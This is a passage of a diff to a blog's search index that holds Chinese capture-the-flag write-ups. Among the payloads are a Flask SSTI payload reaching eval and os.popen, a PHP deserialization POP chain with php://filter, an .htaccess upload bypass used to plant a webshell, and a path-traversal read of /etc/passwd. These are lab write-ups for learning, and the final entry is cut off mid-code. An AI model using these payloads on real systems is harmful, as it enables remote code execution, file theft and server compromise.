class="line">sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br></pre></td></tr></table></figure><p>将三个参数传入TASK类中 调用TASK类中的EXEC方法</p><p>分析下三个参数：<br>第一个参数action是传入read和scan的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要read 才能读取</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="comment">#action默认参数为scan</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>第二个参数传入一个文件名<code>根据提示是flag.txt</code><br>第三个参数sign是一个md5值<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密，考点应该在这里！</p><p>由于我们并没有secert_key的值，所以本来是没得办法的。</p><p>但是/geneSign路由，暴露了getSign函数，</p><p>我们可以根据路由getSign去得到正确的sign值。</p><p>访问一下geneSign传入参数param=flag.txtread得到一串MD5值：</p><p>f8c0d736fa2e823c2b488c82561c4732</p><p><code>然后让flag.txtread + scan拼接加密md5即为</code>sign</p><p>/Delta?param=flag.txt</p><p>Cookie:action=readscan;sign=f8c0d736fa2e823c2b488c82561c4732;</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> SSRF </tag>
-            
-            <tag> wp </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[Flask]SSTI</title>
-      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSTI/%5BFlask%5DSSTI/"/>
-      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSTI/%5BFlask%5DSSTI/</url>
-      
-        <content type="html"><![CDATA[<p>[Flask]SSTI</p><p>payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello HOSTNAME=d43aec63194a PYTHON_PIP_VERSION=19.3.1 HOME=/root GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D PYTHON_GET_PIP_URL=<a href="https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py">https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py</a> SERVER_SOFTWARE=gunicorn/20.0.0 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.6.9 PWD=/app PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee FLAG=flag{044b09a2-bb0b-4dcb-abac-f4ceb70ff40e} }</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> wp </tag>
-            
-            <tag> SSTI </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>[BSidesCF 2020]Had a bad day</title>
       <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BBSidesCF%202020%5DHad%20a%20bad%20day/"/>
       <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BBSidesCF%202020%5DHad%20a%20bad%20day/</url>
@@ -604,35 +604,6 @@
             <tag> buuctf </tag>
             
             <tag> php </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[MRCTF2020]Ezpop</title>
-      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BMRCTF2020%5DEzpop/"/>
-      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BMRCTF2020%5DEzpop/</url>
-      
-        <content type="html"><![CDATA[<p>__construct()//当一个对象创建时被调用</p><p>__destruct() //当一个对象销毁时被调用</p><p>__toString() //当一个对象被当作一个字符串使用</p><p>__sleep()//在对象在被序列化之前运行</p><p>__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p><p>__get()//获得一个类的成员变量时调用</p><p>__set()//设置一个类的成员变量时调用</p><p>__invoke()//调用函数的方式调用一个对象时的回应方法</p><p>__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数</p><p>此处用到的主要是__toString()，__wakeup()，__get()，__invoke()，</p><p>2.</p><p>类中，private变量与protected变量序列化后，变量名会有些异常，</p><p>private变量经反序列化后为\x00 + 类名 + \x00 + 变量名；</p><p>protected变量经反序列化后为，\x00 + * + \x00 + 变量名；</p><p>3.</p><p>列化操作只是保存对象(不是类)的变量，不保存对象的方法，其实反序列化的主要危害在于我们可以控制对象的变量来改变程序执行流程从而达到我们最终的目的。我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到序列化</p><p>O:4:”Show”:2:{s:6:”source”;O:4:”Show”:2:{s:6:”source”;N;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”*var”;s:52:”php://filter/convert.base64-encode/resource=flag.php”;}}}s:3:”str”;N;}</p><p>进行urlencode</p><p>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p><p>得到base64</p><p>PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezQ3MWE5ZmQ0LWUzZGYtNDRiNi04ZDhjLTU4Mjc0MGU4M2ZmYn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>= <span class="string">&quot;flag&#123;471a9fd4-e3df-44b6-8d8c-582740e83ffb&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> php </tag>
-            
-            <tag> wp </tag>
             
         </tags>
       
@@ -670,35 +641,6 @@
     
     
     <entry>
-      <title>[MRCTF2020]你传你🐎呢</title>
-      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/"/>
-      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</url>
-      
-        <content type="html"><![CDATA[<p>最初的htaccess文件是不能上传的，我改了Content-Type后才能上传，但说明能上传htaccess文件，</p><p>htaccess文件：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>原理：他没有过滤 .htaccess后缀，我们可以构建一个htaccess配置文件，让所有格式文件都解析为php，然后再上传图片马（只要后缀是允许的，随便都可以）就会被解析了。</p><p>文件内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>上传.htaccess文件<br>最好把type改成image/jpeg类型</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/.htaccess succesfully uploaded!</p><p>上传.jpg文件马</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/php.jpg succesfully uploaded!</p><p>最后用蚁剑连</p><p><a href="http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg">http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> wp </tag>
-            
-            <tag> 文件上传漏洞 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>[ZJCTF 2019]NiZhuanSiWei</title>
       <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BZJCTF%202019%5DNiZhuanSiWei/"/>
       <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BZJCTF%202019%5DNiZhuanSiWei/</url>
@@ -720,35 +662,6 @@
             <tag> wp </tag>
             
             <tag> 反序列化 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>[强网杯 2019]Upload</title>
-      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/"/>
-      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/</url>
-      
-        <content type="html"><![CDATA[<p>注册</p><p>登录</p><p>传了一个gif</p><p>看到可以访问目录</p><p>cookiebase64解密 得序列化</p><p>怎么是png</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#49;&#50;&#51;&#x34;&#x35;&#54;&#64;&#49;&#x2e;&#x63;&#111;&#x6d;">&#49;&#50;&#51;&#x34;&#x35;&#54;&#64;&#49;&#x2e;&#x63;&#111;&#x6d;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:79:”../upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png”;}</p><p>试试能不能页面跳转</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#49;&#50;&#x33;&#x34;&#53;&#x36;&#x40;&#49;&#x2e;&#x63;&#111;&#109;">&#49;&#50;&#x33;&#x34;&#53;&#x36;&#x40;&#49;&#x2e;&#x63;&#111;&#109;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:31:”../../../../../../../etc/passwd”;}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>/<span class="title">web</span>/<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;../public/upload/0392412bc2d05c02c9fc9c42c86c3fd3/qwe.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Register()</span><br><span class="line"><span class="variable">$a</span>-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>))</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> web安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> buuctf </tag>
-            
-            <tag> wp </tag>
-            
-            <tag> 文件上传漏洞 </tag>
             
         </tags>
       
@@ -786,6 +699,93 @@
     
     
     <entry>
+      <title>[MRCTF2020]你传你🐎呢</title>
+      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/"/>
+      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/</url>
+      
+        <content type="html"><![CDATA[<p>最初的htaccess文件是不能上传的，我改了Content-Type后才能上传，但说明能上传htaccess文件，</p><p>htaccess文件：是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p>原理：他没有过滤 .htaccess后缀，我们可以构建一个htaccess配置文件，让所有格式文件都解析为php，然后再上传图片马（只要后缀是允许的，随便都可以）就会被解析了。</p><p>文件内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>上传.htaccess文件<br>最好把type改成image/jpeg类型</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/.htaccess succesfully uploaded!</p><p>上传.jpg文件马</p><p>/var/www/html/upload/f3e466d5e8513076db058202a1b8722d/php.jpg succesfully uploaded!</p><p>最后用蚁剑连</p><p><a href="http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg">http://c2a02cc3-bae8-4b13-8387-c1f6cb7fbc7a.node3.buuoj.cn/upload/f3e466d5e8513076db058202a1b8722d/php.jpg</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> wp </tag>
+            
+            <tag> 文件上传漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[强网杯 2019]Upload</title>
+      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/"/>
+      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5DUpload/</url>
+      
+        <content type="html"><![CDATA[<p>注册</p><p>登录</p><p>传了一个gif</p><p>看到可以访问目录</p><p>cookiebase64解密 得序列化</p><p>怎么是png</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#49;&#50;&#51;&#x34;&#x35;&#x36;&#x40;&#x31;&#46;&#x63;&#x6f;&#x6d;">&#49;&#50;&#51;&#x34;&#x35;&#x36;&#x40;&#x31;&#46;&#x63;&#x6f;&#x6d;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:79:”../upload/0392412bc2d05c02c9fc9c42c86c3fd3/9185d1d0b5e4e9faec46f10be786ecb8.png”;}</p><p>试试能不能页面跳转</p><p>a:5:{s:2:”ID”;i:3;s:8:”username”;s:7:”admin  “;s:5:”email”;s:12:”<a href="mailto:&#49;&#x32;&#51;&#52;&#x35;&#x36;&#x40;&#x31;&#46;&#99;&#111;&#109;">&#49;&#x32;&#51;&#52;&#x35;&#x36;&#x40;&#x31;&#46;&#99;&#111;&#109;</a>“;s:8:”password”;s:32:”21232f297a57a5a743894a0e4a801fc3”;s:3:”img”;s:31:”../../../../../../../etc/passwd”;}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span 